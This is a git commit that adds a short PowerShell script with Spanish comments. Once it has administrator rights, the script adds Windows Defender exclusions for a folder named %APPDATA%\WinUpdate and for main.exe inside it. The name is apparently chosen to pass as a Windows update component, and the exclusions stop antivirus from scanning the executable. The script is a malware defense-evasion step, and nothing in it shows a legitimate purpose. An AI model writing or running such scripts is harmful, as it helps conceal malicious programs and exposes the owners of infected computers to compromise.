c4e91b81011e9e6457f46685f0b97c82aa20dfe1
areizaaz <133080345+areizaaz@users.noreply.github.com>
2025-04-25 13:39:34 -0500

    Add files via upload

---
+++ powershell.ps1
@@ -0,0 +1,20 @@
+# Verifica si se está ejecutando como administrador
+if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()
+).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Write-Warning "Este script debe ejecutarse como administrador."
+    Pause
+    exit
+}
+
+# Obtener ruta de APPDATA
+$appdata = $env:APPDATA
+$carpetaDestino = Join-Path $appdata "WinUpdate"
+$ejecutable = Join-Path $carpetaDestino "main.exe"
+
+# Agregar exclusión para la carpeta %APPDATA%\WinUpdate
+Add-MpPreference -ExclusionPath $carpetaDestino
+
+# Agregar exclusión para el ejecutable main.exe
+Add-MpPreference -ExclusionProcess $ejecutable
+
+Pause
